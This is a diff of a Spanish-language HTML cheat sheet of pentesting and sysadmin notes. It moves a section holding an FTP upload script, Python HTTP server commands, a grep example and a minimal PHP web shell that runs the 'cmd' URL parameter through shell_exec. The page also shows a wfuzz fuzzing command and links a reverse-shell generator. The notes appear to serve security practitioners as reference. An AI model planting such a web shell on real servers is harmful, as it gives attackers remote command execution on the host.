@@ -14,48 +14,6 @@ und-color:#D3DAEA;height:2px;transition:all .3s;width:20px}.open-menu .toggle sp
 <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Apuntes_0"></a><strong>Wifi</strong></h1>
 <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Apuntes_0"></a><strong>Windows</strong></h1>
 <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Apuntes_0"></a><strong>Servicios</strong></h1>
-<h1 class="code-line" data-line-start=0 data-line-end=1><a id="Apuntes_0"></a><strong>Otros</strong></h1>
-    
-<h4 class="code-line" data-line-start=2 data-line-end=3><a id="FTP_backups_2"></a>FTP backups script</h4>
-<p class="has-line-data" data-line-start="0" data-line-end="1">Script simple escrito en bash para facilitar la subida de archivos a un servidor ftp.</p>
-<pre><code class="has-line-data" data-line-start="4" data-line-end="18" class="language-sh"><span class="hljs-shebang">#!/bin/bash</span>
-HOST=<span class="hljs-string">"www.host.com"</span>
-USER=<span class="hljs-string">"user"</span>
-PASSWORD=<span class="hljs-string">"p4ssw0rD"</span>
-FILES=$(ls *)
-
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$FILES</span>; <span class="hljs-keyword">do</span>
-ftp -inv <span class="hljs-variable">$HOST</span> &lt;&lt;EOF
-user <span class="hljs-variable">$USER</span> <span class="hljs-variable">$PASSWORD</span>
-put <span class="hljs-variable">$i</span>
-<span class="hljs-built_in">bye</span>
-EOF
-<span class="hljs-keyword">done</span>
-</code></pre>
-<p></p>
-<h4 class="code-line" data-line-start=19 data-line-end=20 ><a id="Python_HTTP_server_19"></a>Python HTTP server</h4>
-<p class="has-line-data" data-line-start="0" data-line-end="1">Comando para iniciar un servidor HTTP con python en el puerto que nosotros queramos.</p>
-<pre><code class="has-line-data" data-line-start="21" data-line-end="23" class="language-sh">python2 -m SimpleHTTPServer <span class="hljs-number">8888</span>        <span class="hljs-comment">##### Python2</span>
-</code></pre>
-<pre><code class="has-line-data" data-line-start="24" data-line-end="26" class="language-sh">python3 -m http.server <span class="hljs-number">8888</span>             <span class="hljs-comment">##### Python3</span>
-</code></pre>
-<p></p>
-<h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Buscar_fichero_con_un_string_especfico_0"></a>Buscar fichero con un string específico</h4>
-<p class="has-line-data" data-line-start="1" data-line-end="2">Uso del comando grep para encontrar ficheros que contengan un string específico.</p>
-<pre><code class="has-line-data" data-line-start="3" data-line-end="5" class="language-sh">grep -rni <span class="hljs-string">'/directorio/'</span> <span class="hljs-operator">-e</span> <span class="hljs-string">'Texto que queramos buscar'</span>
-</code></pre>
-<p></p>
-<h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Ejecutar_comandos_en_bash_desde_la_url_0"></a>Ejecutar comandos en bash desde la url</h4>
-<p class="has-line-data" data-line-start="1" data-line-end="2">Para ello es necesario utilizar un pequeño script en php</p>
-<pre><code class="has-line-data" data-line-start="4" data-line-end="12" class="language-php"><span class="hljs-comment">## Name: script.php</span>
-<span class="hljs-preprocessor">&lt;?php</span>
-    <span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];
-
-    <span class="hljs-variable">$output</span> = shell_exec(<span class="hljs-variable">$command</span>);
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;
-<span class="hljs-preprocessor">?&gt;</span>
-</code></pre>
-<p class="has-line-data" data-line-start="22" data-line-end="23">Mediante esta url se pueden ejecutar los comandos desde un navegador: <code>http://&lt;ip&gt;/script.php?cmd=&lt;command&gt;</code></p>
 <p></p>
 <h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="IP_Routing_0"></a>IP Routing</h4>
 <pre><code class="has-line-data" data-line-start="2" data-line-end="4" class="language-sh">ip route add <span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>/<span class="hljs-number">24</span> via &lt;router&gt;
@@ -157,7 +115,48 @@ OPTIONS / HTTP/<span class="hljs-number">1.0</span>
 <pre><code class="has-line-data" data-line-start="24" data-line-end="26" class="language-sh">wfuzz -c --hc=<span class="hljs-number">404</span> -z file,/usr/share/wordlists/dirb/big.txt -z file,extensions.txt http://example.com/FUZZ.FUZ2Z 
 </code></pre>
     
+<h1 class="code-line" data-line-start=0 data-line-end=1><a id="Apuntes_0"></a><strong>Otros</strong></h1>
+<h4 class="code-line" data-line-start=2 data-line-end=3><a id="FTP_backups_2"></a>FTP backups script</h4>
+<p class="has-line-data" data-line-start="0" data-line-end="1">Script simple escrito en bash para facilitar la subida de archivos a un servidor ftp.</p>
+<pre><code class="has-line-data" data-line-start="4" data-line-end="18" class="language-sh"><span class="hljs-shebang">#!/bin/bash</span>
+HOST=<span class="hljs-string">"www.host.com"</span>
+USER=<span class="hljs-string">"user"</span>
+PASSWORD=<span class="hljs-string">"p4ssw0rD"</span>
+FILES=$(ls *)
 
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$FILES</span>; <span class="hljs-keyword">do</span>
+ftp -inv <span class="hljs-variable">$HOST</span> &lt;&lt;EOF
+user <span class="hljs-variable">$USER</span> <span class="hljs-variable">$PASSWORD</span>
+put <span class="hljs-variable">$i</span>
+<span class="hljs-built_in">bye</span>
+EOF
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p></p>
+<h4 class="code-line" data-line-start=19 data-line-end=20 ><a id="Python_HTTP_server_19"></a>Python HTTP server</h4>
+<p class="has-line-data" data-line-start="0" data-line-end="1">Comando para iniciar un servidor HTTP con python en el puerto que nosotros queramos.</p>
+<pre><code class="has-line-data" data-line-start="21" data-line-end="23" class="language-sh">python2 -m SimpleHTTPServer <span class="hljs-number">8888</span>        <span class="hljs-comment">##### Python2</span>
+</code></pre>
+<pre><code class="has-line-data" data-line-start="24" data-line-end="26" class="language-sh">python3 -m http.server <span class="hljs-number">8888</span>             <span class="hljs-comment">##### Python3</span>
+</code></pre>
+<p></p>
+<h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Buscar_fichero_con_un_string_especfico_0"></a>Buscar fichero con un string específico</h4>
+<p class="has-line-data" data-line-start="1" data-line-end="2">Uso del comando grep para encontrar ficheros que contengan un string específico.</p>
+<pre><code class="has-line-data" data-line-start="3" data-line-end="5" class="language-sh">grep -rni <span class="hljs-string">'/directorio/'</span> <span class="hljs-operator">-e</span> <span class="hljs-string">'Texto que queramos buscar'</span>
+</code></pre>
+<p></p>
+<h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Ejecutar_comandos_en_bash_desde_la_url_0"></a>Ejecutar comandos en bash desde la url</h4>
+<p class="has-line-data" data-line-start="1" data-line-end="2">Para ello es necesario utilizar un pequeño script en php</p>
+<pre><code class="has-line-data" data-line-start="4" data-line-end="12" class="language-php"><span class="hljs-comment">## Name: script.php</span>
+<span class="hljs-preprocessor">&lt;?php</span>
+    <span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];
+
+    <span class="hljs-variable">$output</span> = shell_exec(<span class="hljs-variable">$command</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;
+<span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
+<p class="has-line-data" data-line-start="22" data-line-end="23">Mediante esta url se pueden ejecutar los comandos desde un navegador: <code>http://&lt;ip&gt;/script.php?cmd=&lt;command&gt;</code></p>
+<p></p>
 <h4 class="code-line" data-line-start=133 data-line-end=134 ><a id="Links_de_inters_133"></a>Links de interés</h4>
 <h5 class="code-line" data-line-start=135 data-line-end=136 ><a id="Comandos_135"></a>Comandos:</h5>
 <p class="has-line-data" data-line-start="136" data-line-end="137"><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
